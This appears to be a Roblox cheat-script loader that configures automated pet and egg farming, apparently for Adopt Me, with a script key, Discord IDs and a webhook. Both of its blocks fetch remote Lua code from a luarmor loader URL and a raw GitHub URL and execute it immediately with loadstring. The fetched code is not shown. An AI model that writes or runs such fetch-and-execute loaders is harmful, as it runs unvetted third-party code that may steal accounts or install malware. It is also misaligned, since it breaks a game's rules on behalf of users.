task.spawn(function() 
  script_key="QKMGEZZFuGwyPvGdvgXTVWSLuqjwqGhv";
  getgenv().Config = {
      ["PetFarmAutoSwitchFullGrown"] = false,
      ["PetFarmActive"] = true,
      ["EggFarmActive"] = false,
      ["Blur_username"] = true,
      ["Blazing_Lion_Log"] = false,
      ["DiscordId"] = "123456",
      ["Webhook"] = "https://discord.com/api/webhooks/123456",
  }
  loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
end)

task.spawn(function() 
  _G.Config = { UserID = "2ecc7ebd-4788-47be-b07d-43dd6589ac94", discord_id = "1037147029614362624" , Note = "Pc", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/adoptmee"))()
end)
